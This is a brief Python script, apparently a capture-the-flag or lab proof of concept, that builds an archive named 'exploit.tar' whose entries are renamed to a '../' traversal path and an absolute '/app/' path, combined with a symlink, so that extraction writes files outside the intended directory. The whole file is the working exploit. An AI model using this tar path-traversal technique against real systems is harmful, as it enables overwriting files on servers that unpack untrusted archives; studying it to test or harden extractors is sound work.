import tarfile

# make sure that file is some file and rename is a symlink to /app/

def change_name(tarinfo):
    tarinfo.name = "../abc123"
    return tarinfo
def change_name2(tarinfo):
    tarinfo.name = "/app/abc123.tar"
    return tarinfo

with tarfile.open('exploit.tar', 'w') as tar:
    tar.add('./file')
    tar.add('./rename', filter=change_name)
    tar.add('./file', filter=change_name2)
